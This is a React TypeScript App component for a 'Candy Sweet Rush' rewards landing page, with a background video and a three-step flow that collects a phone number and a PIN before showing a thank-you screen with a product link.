import { useState, useRef, useEffect } from 'react'
import PhoneForm from './components/PhoneForm'
import PinForm from './components/PinForm'
import ThankYou from './components/ThankYou'
import candyLogo from './assets/images/candy.png'
import { UserData, PhoneResponse } from './types'
import './styles/App.css'

function App() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [step, setStep] = useState<'phone' | 'pin' | 'success'>('phone')
  const [userData, setUserData] = useState<UserData>({
    userId: '',
    msisdn: '',
    pin: '',
    productUrl: ''
  })

  useEffect(() => {
    if (videoRef.current) {
      videoRef.current.playbackRate = 0.3;
    }
  }, []);

  const handlePhoneSuccess = (data: PhoneResponse) => {
    setUserData(prev => ({
      ...prev,
      userId: data.userId,
      msisdn: data.msisdn,
      pin: data.pin || ''
    }));
    setStep('pin');
  };

  const handlePinSuccess = (productUrl: string) => {
    setUserData(prev => ({
      ...prev,
      productUrl: productUrl
    }));
    setStep('success');
  };

  return (
    <div className="app">
      <video ref={videoRef} className="background-video" autoPlay loop muted playsInline>
        <source src="/candy.mp4" type="video/mp4" />
      </video>
      
      <div className="container">
        <header className="app-header">
          <img src={candyLogo} alt="Candy Sweet Rush" className="header-logo" /> 
          <h1 className="tagline">Unlock Sweet Rewards!</h1>
        </header>

        <main>
          {step === 'phone' && (
            <PhoneForm onSuccess={handlePhoneSuccess} />
          )}
          
          {step === 'pin' && (
            <PinForm
              userId={userData.userId}
              onSuccess={handlePinSuccess}
            />
          )}
          
          {step === 'success' && (
            <ThankYou productUrl={userData.productUrl} />
          )}
        </main>

        <footer className="app-footer">
          <p className="terms-text">
            By continuing, you agree to our<br />
            Terms & Privacy Policy.
          </p>
        </footer>
      </div>
    </div>
  )
}

export default App
